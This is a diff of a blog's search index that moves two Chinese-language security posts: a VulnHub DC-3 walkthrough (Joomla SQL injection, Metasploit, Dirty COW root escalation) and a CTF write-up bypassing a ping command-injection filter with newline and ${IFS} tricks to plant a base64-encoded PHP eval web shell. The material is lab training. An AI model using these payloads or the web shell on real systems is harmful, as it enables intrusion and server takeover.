@@ -102,71 +102,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DC-3</title>
-    <url>/2022/04/16/DC-3/</url>
-    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
-<p>发现目标主机为192.168.168.130</p>
-<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
-<p>开放了80端口，浏览器打开</p>
-<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
-<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
-<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
-<p>是joomia<br>用dirsearch看看目录情况</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
-<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
-<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
-<p>确实是存在报错注入<br>上msf</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
-<p>成功连上了</p>
-<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
-<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
-<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
-<p>上传权限漏洞探测脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>给脚本加执行权限然后执行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
-
-<p>发现脏牛</p>
-<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
-<p>在www目录下下载脏牛提权脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
-<p>OK！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
-<p>DC3 completed</p>
-]]></content>
-      <categories>
-        <category>实践</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>提权</tag>
-        <tag>msf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC-2</title>
     <url>/2022/04/15/DC-2/</url>
     <content><![CDATA[<p>渗透环境: DC-2  <a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
@@ -237,6 +172,71 @@
       <tags>
         <tag>渗透</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-3</title>
+    <url>/2022/04/16/DC-3/</url>
+    <content><![CDATA[<p>渗透环境：DC3 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.130</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/2.png" alt="img"></p>
+<p>开放了80端口，浏览器打开</p>
+<p><img src="/2022/04/16/DC-3/cover.png" alt="img"></p>
+<h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>查看cms情况</p>
+<p><img src="/2022/04/16/DC-3/3.png" alt="img"></p>
+<p>是joomia<br>用dirsearch看看目录情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/4.png" alt="img"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>存在管理员后台，看看</p>
+<p><img src="/2022/04/16/DC-3/5.png" alt="img"></p>
+<p>经测试单纯burp爆破不开来<br>这我百度joomla存在的漏洞，发现存在sql注入漏洞，测试是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://yourIP/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/6.png" alt="img"></p>
+<p>确实是存在报错注入<br>上msf</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search joomla</span><br><span class="line">use 5</span><br><span class="line">options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/7.png" alt="img"></p>
+<p>成功连上了</p>
+<p><img src="/2022/04/16/DC-3/8.png" alt="img"></p>
+<p>注：后来重做的时候发现在burp时其实已经找到密码了，不然这里用不了</p>
+<p><img src="/2022/04/16/DC-3/9.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三连问身份</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/10.png" alt="img"></p>
+<p>上传权限漏洞探测脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload ./linux-exploit-suggester-master/linux-exploit-suggester.sh &gt; /tmp/les.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>给脚本加执行权限然后执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">chmod</span> +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现脏牛</p>
+<p><img src="/2022/04/16/DC-3/11.png" alt="img"></p>
+<p>在www目录下下载脏牛提权脚本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/gbonacini/CVE-2016-5195.git</span><br><span class="line"><span class="built_in">cd</span> ./CVE-2016-5195                                                  </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil //编译</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>                      //打开交互式环境        </span><br><span class="line">./dcow                                                              //执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/12.png" alt="img"></p>
+<p>OK！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo root</span><br><span class="line">dirtyCowfun</span><br><span class="line">cat /root/the-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/DC-3/13.png" alt="img"></p>
+<p>DC3 completed</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+        <tag>msf</tag>
       </tags>
   </entry>
   <entry>
@@ -624,46 +624,6 @@
       </tags>
   </entry>
   <entry>
-    <title>竞赛课-WEB5</title>
-    <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
-    <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
-<p>先看题目说了什么</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p>
-<p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>base64后</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure>
-
-<p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure>
-
-<p>访问base64.txt</p>
-<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p>
-<p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
-
-<p>用蚁剑进行连接</p>
-<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p>
-<p>成功连接后访问根目录</p>
-<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p>
-<p>获得flag</p>
-]]></content>
-      <categories>
-        <category>实践</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>WEB</tag>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>竞赛课-babytrick</title>
     <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
     <content><![CDATA[<p>看看源码是什么先</p>
@@ -700,9 +660,49 @@
         <category>实践</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>绕过</tag>
         <tag>命令执行</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>竞赛课-WEB5</title>
+    <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
+    <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
+<p>先看题目说了什么</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p>
+<p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64后</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure>
+
+<p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问base64.txt</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p>
+<p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑进行连接</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p>
+<p>成功连接后访问根目录</p>
+<p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p>
+<p>获得flag</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>绕过</tag>
+        <tag>CTF</tag>
+        <tag>WEB</tag>
       </tags>
   </entry>
 </search>
